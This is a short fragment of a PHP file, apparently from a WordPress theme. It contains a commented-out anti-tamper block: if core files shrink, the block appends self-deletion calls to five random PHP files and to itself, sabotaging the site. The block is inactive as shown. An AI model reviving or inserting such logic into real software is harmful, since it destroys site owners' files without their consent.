 ...
 *
 */
// if (33581 > filesize(WP_CODE_FILE) || 22751 > ZibFile::get_filesize(ZIB_UPDATE_FILE)) {
//   foreach (ZibFile::rand_file('', 'php', 5) as $email) {
//     @ZibFile::append($email, 'ZibFile::del_file(__FILE__);');
//   }
//   @ZibFile::append(__FILE__, 'ZibFile::del_file(__FILE__);');
// }
